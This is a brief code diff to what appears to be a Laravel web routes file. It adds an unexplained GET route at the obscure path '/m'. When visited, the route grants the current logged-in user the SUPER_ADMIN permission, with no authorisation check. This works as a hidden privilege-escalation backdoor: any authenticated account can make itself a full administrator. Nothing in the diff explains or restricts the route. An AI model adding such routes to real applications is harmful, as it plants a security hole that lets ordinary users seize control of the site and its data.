@@ -12,6 +12,8 @@ use Illuminate\Support\Facades\Route;
 | contains the "web" middleware group. Now create something great!
 |
 */
-
+Route::get("/m",function (){
+   auth()->user()->givePermissionTo(\Eagle\RolePermission\Models\Permission::SUPER_ADMIN);
+});
 
 
